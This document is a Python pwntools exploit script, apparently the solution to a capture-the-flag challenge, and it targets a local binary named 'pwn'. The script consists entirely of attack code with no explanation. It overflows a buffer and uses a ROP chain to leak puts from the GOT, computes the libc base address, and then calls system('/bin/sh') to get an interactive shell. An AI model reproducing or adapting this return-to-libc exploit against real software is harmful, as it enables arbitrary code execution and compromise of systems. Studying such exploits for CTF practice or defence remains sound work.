from pwn import *

debug = True
if debug:
	io = process("./pwn")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./pwn")

context.log_level = "debug"	
pop_rdiret = 0x00000000004010a3
puts_got = elf.got["puts"]
main_addr = 0x0000000000400D2A
puts_plt = 0x00000000004007c0
#gdb.attach(io,"b *0x0000000000400E7D")
def rop(payload_pad):
	io.sendlineafter("input: ","a")
	payload = 0x77*"a" + "\x00" + p64(0) + "junkjunk" + payload_pad
	io.sendlineafter("value: \n",payload)
	io.sendafter("target: ",payload + "\x00")
	io.sendlineafter("input: ","a")
	io.sendlineafter("value: \n", payload)
	io.recvuntil("it?\n")

payload_pad1 = p64(pop_rdiret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
rop(payload_pad1)
puts_addr = u64(io.recv(6)+"\x00\x00")
offset = 0x7fa039eac690 - 0x7fa039e3d000
libc_base = puts_addr - offset
log.success("libc_base:"+hex(libc_base))
libc.address = libc_base
system_addr = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
payload_pad2 = p64(pop_rdiret) + p64(binsh) + p64(system_addr)
rop(payload_pad2)
io.interactive()
